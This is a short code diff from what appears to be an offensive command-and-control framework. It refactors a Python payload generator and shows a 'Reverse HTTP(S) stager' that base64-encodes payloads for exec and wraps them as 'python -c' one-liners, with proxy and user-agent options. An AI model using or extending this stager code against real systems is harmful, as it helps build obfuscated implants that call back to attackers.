@@ -37,13 +37,13 @@ class PythonPayload(BasePayload):
             ssl=stager_db.listener.ssl,
             random_size=stager_db.random_size,
             timeout=stager_db.timeout,
+            different_address=stager_db.different_address,
             delay=stager_db.delay,
             sleep_time=stager_db.options["sleep-time"],
             user_agent=stager_db.options["user-agent"],
             proxy_address=stager_db.options["proxy_address"],
             proxy_port=stager_db.options["proxy_port"],
             proxy_auth=stager_db.options["proxy_auth"],
-            different_address=stager_db.options["different-address"]
         )
         if stager_db.encoding == "base64":
             output = f"import base64;exec(base64.b64decode('{base64.b64encode(output.encode()).decode()}'))"
@@ -55,10 +55,9 @@ class PythonPayload(BasePayload):
         if one_liner:
             output = 'python -c "' + output + '"'
         return FinalPayload(cls, stager_db, output)
-
-    def __str__(self) -> str:
-        return self.__class__.__name__
-
+    
+    def is_compiled(self, stager_db: "StagerModel") -> bool:
+        return False
 class Stager(BaseStager):
     name = "http-reverse"
     description = "Reverse HTTP(S) stager"
